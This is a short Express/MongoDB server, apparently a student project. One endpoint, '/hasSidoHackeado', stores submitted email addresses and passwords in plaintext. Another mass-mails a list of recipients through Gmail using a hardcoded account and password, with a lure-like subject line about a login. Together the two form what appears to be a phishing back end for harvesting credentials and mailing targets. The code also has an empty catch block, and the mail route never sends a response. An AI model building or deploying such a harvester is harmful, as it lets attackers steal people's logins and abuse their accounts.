const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
require("dotenv").config();
const nodemailer = require('nodemailer');

const app = express();
app.use(cors());
app.use(bodyParser.json());

mongoose.connect(process.env.MONGO_URI,{
    useNewUrlParser: true,
    useUnifiedTopology: true
});

const datos =  new  mongoose.Schema({
    email: String,
    password: String
})

const usuario =  mongoose.model('usuario', datos);

app.post("/hasSidoHackeado", async ( req , res ) => {
    const { email , password } = req.body;
    const usuarioBD = new usuario({ email , password });
    await usuarioBD.save();
    res.status(201).send("Informacion  guardada");
});

app.post("/enviarEmail", async (req, res)=>{
    const { correos } = req.body;
    try {
        let trasnsportador = nodemailer.createTransport({service:'gmail', auth:{user:'john.mata@epn.edu.ec', pass:'1234'}})
        const respuesta = await trasnsportador.sendMail({from:'correooooooooooo', to:correos.join(','), subject:'Acabas de iniciaser '})
    } catch (error) {
        
    } 
})

app.listen(3000,  () => {
    console.log("Servidor escuchando en el puerto 3000");
})


